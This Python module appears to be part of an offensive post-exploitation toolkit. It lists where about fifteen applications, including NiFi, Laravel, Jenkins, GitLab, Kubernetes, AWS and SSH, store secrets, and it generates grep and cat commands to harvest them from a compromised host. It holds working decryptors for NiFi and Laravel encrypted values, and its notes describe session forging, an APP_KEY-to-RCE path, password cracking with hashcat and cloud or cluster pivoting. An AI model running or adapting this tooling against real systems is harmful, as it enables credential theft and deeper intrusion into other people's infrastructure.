"""Generalized app-config secret extraction library.

The Helix / NiFi lesson as a class: apps store secrets in well-known files, in
well-known formats, protected by a well-known key. Instead of a per-app decrypt
module, this is a **library** of *where* apps store secrets and *how* they are
encoded, keyed to a detected app class. Two use cases:

1. **Discovery**: given a detected app + a shell, print the concrete paths + the
   grep expressions that surface its secrets (`config_paths(app)`), plus a note on
   the encryption scheme when one applies.
2. **Decode**: given a recovered ciphertext + the app-specific key material,
   decrypt with the app's native scheme (`decrypt(app, ciphertext, key)`).

Pure data + pure functions. Adding a new app is one entry, not a new module.
"""

from __future__ import annotations

import base64
import hashlib
import re
from dataclasses import dataclass, field


@dataclass
class AppSecretsProfile:
    app: str
    # Where the app stores secrets on a compromised host (absolute paths + globs).
    config_paths: list[str] = field(default_factory=list)
    # Interesting keys to grep for (regex fragments).
    secret_markers: list[str] = field(default_factory=list)
    # Optional: how the app encrypts the secrets. Filled for apps where a
    # decrypt() implementation is available (see decrypt() below).
    scheme: str = ""             # e.g. "nifi-pbkdf2-aes-gcm", "django-fernet"
    # Where the app stores the master key that reverses the scheme.
    key_paths: list[str] = field(default_factory=list)
    key_marker: str = ""         # regex to pull the key out of key_paths
    notes: str = ""


_PROFILES: dict[str, AppSecretsProfile] = {
    "nifi": AppSecretsProfile(
        app="Apache NiFi",
        config_paths=[
            "/opt/nifi*/conf/flow.json.gz", "/opt/nifi*/conf/flow.xml.gz",
            "/opt/nifi*/conf/nifi.properties", "/opt/nifi*/conf/authorizers.xml",
            "/opt/nifi*/conf/login-identity-providers.xml"],
        secret_markers=[r"enc\{[0-9a-f]{20,}\}", r"Password\s*[:=]\s*enc\{[^}]+\}",
                        r"nifi\.sensitive\.props\.key"],
        scheme="nifi-pbkdf2-aes-gcm",
        key_paths=["/opt/nifi*/conf/nifi.properties"],
        key_marker=r"nifi\.sensitive\.props\.key=([^\s]+)",
        notes=("Static salt 'NiFi Static Salt' (hex 4e694669205374617469632053616c74), "
               "PBKDF2-HMAC-SHA512 x160000 -> 32B key, AES-GCM 12B IV. The blob is "
               "hex(iv||ciphertext); ciphertext ends with a 16B GCM tag."),
    ),
    "django": AppSecretsProfile(
        app="Django",
        config_paths=["*/settings.py", "*/local_settings.py", "*/.env"],
        secret_markers=[r"SECRET_KEY\s*=\s*['\"]([^'\"]+)['\"]",
                        r"DATABASES\s*=\s*\{"],
        scheme="django-signed-cookies",
        notes=("SECRET_KEY signs session cookies + password reset tokens. With it "
               "you can forge sessions (django-signing) and pickle-poison old "
               "signed data."),
    ),
    "laravel": AppSecretsProfile(
        app="Laravel",
        config_paths=["*/.env", "*/config/app.php"],
        secret_markers=[r"APP_KEY\s*=\s*(base64:[A-Za-z0-9+/=]+)",
                        r"DB_(?:HOST|USERNAME|PASSWORD|DATABASE)="],
        scheme="laravel-aes-cbc",
        notes=("APP_KEY encrypts sessions/cookies (AES-256-CBC by default). With "
               "the key + a deserialization gadget (phpggc laravel/rce) -> RCE."),
    ),
    "rails": AppSecretsProfile(
        app="Ruby on Rails",
        config_paths=["config/master.key", "config/credentials.yml.enc",
                      "config/secrets.yml", "config/database.yml"],
        secret_markers=[r"secret_key_base:\s*(\S+)", r"password:\s*(\S+)"],
        scheme="rails-message-encryptor",
        key_paths=["config/master.key"],
        key_marker=r"^([0-9a-f]{32,})",
        notes=("master.key + credentials.yml.enc = credentials. rails "
               "'ActiveSupport::MessageEncryptor' AES-256-GCM."),
    ),
    "spring": AppSecretsProfile(
        app="Spring Boot",
        config_paths=["*/application.properties", "*/application.yml",
                      "*/bootstrap.yml", "*/.env"],
        secret_markers=[r"spring\.datasource\.password\s*=\s*(\S+)",
                        r"spring\.security\.user\.password\s*=\s*(\S+)",
                        r"jasypt\.encryptor\.password\s*=\s*(\S+)"],
        scheme="jasypt-pbewithmd5anddes",
        notes=("jasypt property encryption: values look like ENC(...). Master "
               "password is either jasypt.encryptor.password (file/env) or a "
               "JVM property. Decrypt with `jasypt-cli decrypt`."),
    ),
    "wordpress": AppSecretsProfile(
        app="WordPress",
        config_paths=["wp-config.php", "*/wp-config.php", "*/wp-config.php.bak"],
        secret_markers=[r"DB_PASSWORD['\"]?\s*,\s*['\"]([^'\"]+)['\"]",
                        r"AUTH_KEY['\"]?\s*,\s*['\"]([^'\"]+)['\"]"],
        notes=("wp-config.php has DB creds + AUTH_KEY set (nonce/cookie signing). "
               "DB creds unlock the users table (hashcat -m 400 for phpass)."),
    ),
    "joomla": AppSecretsProfile(
        app="Joomla",
        config_paths=["configuration.php", "*/configuration.php"],
        secret_markers=[r"\$password\s*=\s*['\"]([^'\"]+)['\"]",
                        r"\$secret\s*=\s*['\"]([^'\"]+)['\"]"],
        notes=("configuration.php holds DB creds + secret. Joomla stores admin "
               "hashes in #__users (bcrypt/phpass; hashcat -m 400 / -m 3200)."),
    ),
    "drupal": AppSecretsProfile(
        app="Drupal",
        config_paths=["sites/default/settings.php", "*/sites/default/settings.php"],
        secret_markers=[r"'password'\s*=>\s*'([^']+)'", r"drupal_hash_salt"],
        notes=("settings.php: $databases DB creds + hash_salt. Users table has "
               "phpass; drupal_hash_salt lets you forge legacy session tokens."),
    ),
    "grafana": AppSecretsProfile(
        app="Grafana",
        config_paths=["/etc/grafana/grafana.ini", "/var/lib/grafana/grafana.db"],
        secret_markers=[r"admin_password\s*=\s*(\S+)",
                        r"secret_key\s*=\s*(\S+)"],
        notes=("grafana.ini: admin_password + secret_key. grafana.db (SQLite) "
               "holds data_source.secure_json_data encrypted with secret_key."),
    ),
    "gitlab": AppSecretsProfile(
        app="GitLab",
        config_paths=["/etc/gitlab/gitlab.rb", "/etc/gitlab/initial_root_password",
                      "/var/opt/gitlab/gitlab-rails/etc/secrets.yml"],
        secret_markers=[r"gitlab_rails\['db_password'\]\s*=\s*['\"]([^'\"]+)['\"]",
                        r"^Password:\s*(\S+)"],
        notes=("initial_root_password on first-run; gitlab.rb for DB/SMTP; "
               "secrets.yml holds otp_key_base + db_key_base (2FA + TokenAuth)."),
    ),
    "jenkins": AppSecretsProfile(
        app="Jenkins",
        config_paths=["/var/lib/jenkins/secrets/master.key",
                      "/var/lib/jenkins/secrets/hudson.util.Secret",
                      "/var/lib/jenkins/credentials.xml",
                      "/var/lib/jenkins/users/*/config.xml"],
        secret_markers=[r"\{[A-Za-z0-9+/=]{20,}\}"],
        scheme="jenkins-master-hudson",
        key_paths=["/var/lib/jenkins/secrets/master.key",
                   "/var/lib/jenkins/secrets/hudson.util.Secret"],
        notes=("Credentials in credentials.xml/user config.xml wrap '{ciphertext}'. "
               "Decrypt via master.key XOR hudson.util.Secret -> AES-128-ECB. "
               "There are working PoC scripts; do NOT hand-roll."),
    ),
    "keepass": AppSecretsProfile(
        app="KeePass DB",
        config_paths=["*.kdbx", "*.kdb"],
        secret_markers=[],
        scheme="keepass-kdbx",
        notes=("hashcat -m 13400 with kdbx2john / keepass2john extraction."),
    ),
    "ssh": AppSecretsProfile(
        app="SSH keys",
        config_paths=["~/.ssh/id_rsa", "~/.ssh/id_ed25519", "/etc/ssh/ssh_host_*_key",
                      "/root/.ssh/id_*", "/home/*/.ssh/id_*"],
        secret_markers=[r"-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----"],
        notes=("Passphrase-protected keys: ssh2john -> hashcat -m 22921 (RSA/ECDSA) "
               "or -m 22921 with the right subtype for OpenSSH."),
    ),
    "kubernetes": AppSecretsProfile(
        app="Kubernetes",
        config_paths=["/var/run/secrets/kubernetes.io/serviceaccount/token",
                      "~/.kube/config"],
        secret_markers=[r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+"],
        notes=("Pod service-account token = JWT to the API server. Use with "
               "kubectl --token=... to enumerate RBAC and pivot."),
    ),
    "aws": AppSecretsProfile(
        app="AWS credentials",
        config_paths=["~/.aws/credentials", "~/.aws/config",
                      "/root/.aws/credentials"],
        secret_markers=[r"aws_access_key_id\s*=\s*(AKIA[0-9A-Z]{16})",
                        r"aws_secret_access_key\s*=\s*([A-Za-z0-9/+]{40})"],
        notes=("aws sts get-caller-identity; enumerate IAM (aws-vault / pacu)."),
    ),
}


def profile(app: str) -> AppSecretsProfile | None:
    """Case-insensitive lookup by app token (matches any key substring)."""
    if not app:
        return None
    a = app.lower()
    for key, prof in _PROFILES.items():
        if key in a or a in key:
            return prof
    return None


def profiles_for_state(state) -> list[AppSecretsProfile]:
    """Every profile whose token appears in a service note/product in the state."""
    hay = " ".join(
        (s.product or "") + " " + (s.name or "") + " " + " ".join(s.notes)
        for h in state.hosts.values() for s in h.services.values()
    ).lower()
    return [p for k, p in _PROFILES.items() if k in hay]


def discovery_commands(prof: AppSecretsProfile) -> list[str]:
    """Concrete shell commands to surface the app's secrets on a compromised host."""
    cmds: list[str] = []
    for path in prof.config_paths:
        cmds.append(f"ls -la {path} 2>/dev/null")
    if prof.secret_markers:
        marker = "|".join(prof.secret_markers)
        # Use zgrep for .gz configs (nifi flow.json.gz).
        cmds.append(f"grep -rhE '{marker}' {' '.join(prof.config_paths)} 2>/dev/null | head -40")
        if any(p.endswith(".gz") for p in prof.config_paths):
            gz = " ".join(p for p in prof.config_paths if p.endswith(".gz"))
            cmds.append(f"zgrep -hE '{marker}' {gz} 2>/dev/null | head -40")
    if prof.key_paths:
        cmds.append(f"cat {' '.join(prof.key_paths)} 2>/dev/null | head -20")
    return cmds


# --- decoders -------------------------------------------------------------
# Only apps with a straightforward Python-implementable scheme. NiFi uses its
# own JVM PropertyEncryptor at runtime; we replicate the KDF here.

_NIFI_STATIC_SALT = bytes.fromhex("4e694669205374617469632053616c74")   # "NiFi Static Salt"


def decrypt_nifi(cipher_hex: str, sensitive_props_key: str) -> str | None:
    """Decrypt a NiFi ``enc{HEX}`` sensitive value with the sensitive.props.key.

    Algorithm (NIFI_PBKDF2_AES_GCM_256):
    * derive key = PBKDF2-HMAC-SHA512(sensitive_props_key, "NiFi Static Salt",
      iterations=160000, dklen=32);
    * blob = hex-decode(cipher_hex); iv = blob[:12]; ct = blob[12:];
    * plaintext = AES-256-GCM.decrypt(key, iv, ct, aad=None).

    Returns the plaintext string or None if `cryptography` is missing / decrypt fails.
    """
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    except Exception:
        return None
    try:
        blob = bytes.fromhex(cipher_hex.strip().removeprefix("enc{").rstrip("}"))
    except ValueError:
        return None
    if len(blob) < 12 + 16:                # iv + at least the GCM tag
        return None
    iv, ct = blob[:12], blob[12:]
    key = hashlib.pbkdf2_hmac("sha512", sensitive_props_key.encode(),
                              _NIFI_STATIC_SALT, 160000, dklen=32)
    try:
        return AESGCM(key).decrypt(iv, ct, None).decode(errors="replace")
    except Exception:
        return None


def decrypt_laravel(cipher_b64: str, app_key: str) -> str | None:
    """Decrypt a Laravel `encrypter`-produced payload with APP_KEY.

    Laravel wraps: base64(JSON({iv, value, mac})) where value is AES-256-CBC
    ciphertext. Returns the plaintext, or None on any failure / missing dep.
    """
    try:
        import hmac
        import json as _json

        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    except Exception:
        return None
    try:
        obj = _json.loads(base64.b64decode(cipher_b64))
        iv = base64.b64decode(obj["iv"])
        value = base64.b64decode(obj["value"])
        mac = obj["mac"]
        key_b = base64.b64decode(app_key.removeprefix("base64:"))
        expected = hmac.new(key_b, obj["iv"].encode() + obj["value"].encode(),
                            hashlib.sha256).hexdigest()
        if not hmac.compare_digest(expected, mac):
            return None
        cipher = Cipher(algorithms.AES(key_b), modes.CBC(iv))
        pt = cipher.decryptor().update(value) + cipher.decryptor().finalize()
        pad = pt[-1]
        return pt[:-pad].decode(errors="replace")
    except Exception:
        return None


# Dispatch by scheme name.
_DECODERS = {
    "nifi-pbkdf2-aes-gcm": decrypt_nifi,
    "laravel-aes-cbc": decrypt_laravel,
}


def decrypt(app: str, ciphertext: str, key: str) -> str | None:
    """Decrypt an app-config secret when we have a built-in decoder; else None."""
    prof = profile(app)
    if prof is None:
        return None
    fn = _DECODERS.get(prof.scheme)
    if fn is None:
        return None
    return fn(ciphertext, key)


# --- helpers --------------------------------------------------------------

def find_encrypted_values(text: str) -> list[str]:
    """Pull `enc{...}`, `ENC(...)`, `{ciphertext}` blobs out of a text blob.

    Handy when running discovery_commands output through a single grep step:
    the caller feeds this back to decrypt() with the matching app key material.
    """
    hits: list[str] = []
    for pat in (r"enc\{[0-9a-fA-F]+\}", r"ENC\([A-Za-z0-9+/=]+\)",
                r"\{[A-Za-z0-9+/=]{24,}\}"):
        hits += re.findall(pat, text or "")
    return list(dict.fromkeys(hits))
